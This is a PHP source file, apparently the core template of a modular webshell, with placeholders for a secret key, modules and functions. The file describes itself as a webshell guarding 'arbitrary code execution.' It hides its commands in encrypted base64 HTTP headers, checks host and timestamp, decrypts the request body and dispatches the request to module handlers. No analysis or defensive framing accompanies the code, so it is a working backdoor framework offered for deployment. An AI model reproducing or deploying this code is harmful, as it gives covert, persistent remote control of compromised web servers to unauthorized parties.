<?php

/**
 * ==========================================================================
 *  Error reporting
 * ==========================================================================
 */

ini_set('display_errors', 1);
error_reporting(E_ALL);

// ini_set('display_errors', 0);
// error_reporting(0);


/**
 * ==========================================================================
 *  BaseModule
 *      Base class for all module.
 *      This is a singleton.
 * ==========================================================================
 */

class BaseModule
{
    protected static $_instance = null;
    protected $_data = null;
    protected $_body = null;

    protected function __construct() {
    }

    protected function __clone() {
    }

    public static function getInstance() {
        if(is_null(static::$_instance)) {
            static::$_instance = new static();
        }
        return static::$_instance;
    }

    public function setData($data) {
        $this->_data = $data;
    }

    protected function get($key) {
        if (array_key_exists($key, $this->_data)) {
            return $this->_data[$key];
        }

        fail();
    }

    public function setBody($body) {
        $this->_body = $body;
    }

    protected function body() {
        return $this->_body;
    }
}


/**
 * ==========================================================================
 *  Secret
 *
 *  This secret key must NEVER be shared with someone else.
 *  It's your way of authenticating to this webshell and protect the server
 *      from unauthorized access and arbitrary code execution.
 * ==========================================================================
 */

//{SECRETKEY}


/**
 * ==========================================================================
 *  Modules
 * ==========================================================================
 */

//{MODULELIST}
//{MODULES}


/**
 * ==========================================================================
 *  Functions
 * ==========================================================================
 */

//{FUNCTIONS}


/**
 * ==========================================================================
 *  Authentication
 *      Checks authentication header.
 *      Parses payload headers.
 * ==========================================================================
 */

function authenticate() {
    global $SECRET_KEY, $MODULES;
    $SERVER_HOST = str_replace('www.', '', $_SERVER['HTTP_HOST']);

    $h_auth = null;
    $h_module = null;
    $h_data = null;
    $h_count = 0;

    // Check all HTTP_* headers (PHP parsing) to retrieve the auth & data payloads
    foreach ($_SERVER as $key => $value) {
        if (substr($key, 0, 5) == 'HTTP_') {
            // Has header a base64 value ?
            if (preg_match('#^[a-z0-9+/=]+$#i', $_SERVER[$key])) {
                // Decipher the header
                $tmp = strdecrypt($_SERVER[$key], $SECRET_KEY);

                // Is plain header correctly formed ? (indicator + payload)
                if (!is_null($tmp) && preg_match('#^[0-2]\|#', $tmp)) {
                    $h_count++;
                    $indicator = (int) substr($tmp, 0, 1);
                    $value = substr($tmp, 2);

                    // Fill the headers
                    switch ($indicator) {
                        case 0:
                            $h_auth = $value;
                            break;
                        case 1:
                            $h_module = $value;
                            break;
                        case 2:
                            $h_data = $value;
                            break;
                    }
                }
            }
        }
    }

    // Authenticate with given HTTP headers
    if ($h_count === 3 && !is_null($h_auth) && !is_null($h_module) && !is_null($h_data)) {
        $auth = explode('|', $h_auth);
        $module = $h_module;
        $datafull = json_decode($h_data, true);

        // Check if module is present
        if (in_array($module, $MODULES)) {
            // Check data was correct JSON
            if (!is_null($datafull) && array_key_exists('handler', $datafull) && array_key_exists('data', $datafull) && preg_match('#^[a-z_]+$#i', $datafull['handler'])) {
                // Check auth header (host & timestamp)
                if (count($auth) === 2 && $auth[0] === $SERVER_HOST) {
                    $current_timestamp = time();
                    $auth_timestamp = (int) $auth[1];

                    if ($auth_timestamp >= ($current_timestamp-2) && $auth_timestamp <= ($current_timestamp+1)) {
                        route($module, $datafull['handler'], $datafull['data']);
                        return;
                    }
                    // In case of healthstatus call, grant access (untimestamped request)
                    elseif ($module === 'core' && $datafull['handler'] === 'healthstatus') {
                        route('core', 'healthstatus');
                        return;
                    }
                }
            }
        }
    }

    fail();
}


/**
 * ==========================================================================
 *  Routing
 *      Calls the Module & method that correspond to the request.
 * ==========================================================================
 */

function route($module, $handler, $data=array()) {
    global $SECRET_KEY;
    $className = ucfirst(strtolower($module)).'Module';
    $methodName = 'api_'.$handler;

    if (class_exists($className)) {
        $mod = call_user_func(array($className, 'getInstance'));

        if (method_exists($mod, $methodName)) {
            $mod->setData($data);

            // Check body
            $body = @file_get_contents('php://input');
            if (preg_match('#^[a-z0-9+/=]+$#i', $body)) {
                $body = strdecrypt($body, $SECRET_KEY);
                if (!is_null($body)) {
                    $mod->setBody($body);
                }
            }

            // Call module handler
            echo call_user_func(array($mod, $methodName));
            exit;
        }
    }

    fail();
}


/**
 * ==========================================================================
 *  Run.
 * ==========================================================================
 */

authenticate();
